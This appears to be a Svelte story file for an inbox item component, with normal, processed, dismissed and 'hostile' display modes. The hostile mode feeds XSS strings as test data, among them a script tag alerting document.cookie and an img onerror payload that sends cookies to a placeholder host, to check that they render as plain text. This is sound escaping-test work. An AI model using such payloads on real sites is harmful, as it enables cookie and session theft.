<!-- SPDX-License-Identifier: BUSL-1.1
     Copyright (c) 2026 Jérôme Bastian Winkel -->
<script lang="ts">
  // The workbench's wrapper, and the one fixture that matters: an arrival whose subject is a
  // script tag. An intake address is public — anybody who learns it can put a string in front of a
  // reader — so what this story shows is the string drawn as characters.

  import Button from './Button.svelte';
  import JumbleInboxItem from './JumbleInboxItem.svelte';
  import Stack from './Stack.svelte';

  const { mode = 'new' }: { mode?: 'new' | 'processed' | 'dismissed' | 'hostile' } = $props();

  const received = '2026-09-08T07:41:00Z';
</script>

{#snippet decide()}
  <Button tone="primary">Make an entry from it</Button>
  <Button tone="subtle">Dismiss</Button>
{/snippet}

{#if mode === 'processed'}
  <JumbleInboxItem
    subject="Re: quarterly figures — the deck for Thursday"
    excerpt="Attaching the current version. The numbers on slide 4 are still provisional."
    channelLabel="Email"
    sender="mara@example.org"
    senderLabel="From"
    receivedLabel="8 September, 09:41"
    receivedAt={received}
    status="PROCESSED"
    statusLabel="Made into an entry"
    targetHref="#entry"
    targetLabel="Prepare the quarterly deck"
  />
{:else if mode === 'dismissed'}
  <JumbleInboxItem
    subject="Newsletter: eleven productivity hacks"
    excerpt="You are receiving this because you once downloaded a template."
    channelLabel="Email"
    sender="news@example.com"
    senderLabel="From"
    receivedLabel="7 September, 18:02"
    receivedAt="2026-09-07T16:02:00Z"
    status="DISMISSED"
    statusLabel="Dismissed"
    dismissedNote="Dismissed, not deleted. It stays readable here until the retention rule removes it."
  />
{:else if mode === 'hostile'}
  <Stack gap="150">
    <JumbleInboxItem
      subject={'<script>alert(document.cookie)<\/script>'}
      excerpt={'<img src=x onerror="fetch(\'https://example.invalid/?c=\'+document.cookie)">\n\nAnd a second line, so the whitespace shows.'}
      channelLabel="Email"
      sender={'<b>finance@example.org</b>'}
      senderLabel="From"
      receivedLabel="8 September, 09:41"
      receivedAt={received}
      status="NEW"
      statusLabel="Undecided"
      actions={decide}
    />
    <JumbleInboxItem
      subject="ThisIsOneUnbrokenSubjectLineOfTheKindAMachineSendsAndNoHumanWouldEverTypeIntoAField"
      channelLabel="Webhook"
      receivedLabel="8 September, 09:44"
      status="NEW"
      statusLabel="Undecided"
    />
  </Stack>
{:else}
  <JumbleInboxItem
    subject="Re: quarterly figures — the deck for Thursday"
    excerpt={'Attaching the current version.\n\nThe numbers on slide 4 are still provisional.'}
    channelLabel="Email"
    sender="mara@example.org"
    senderLabel="From"
    receivedLabel="8 September, 09:41"
    receivedAt={received}
    status="NEW"
    statusLabel="Undecided"
    actions={decide}
  />
{/if}
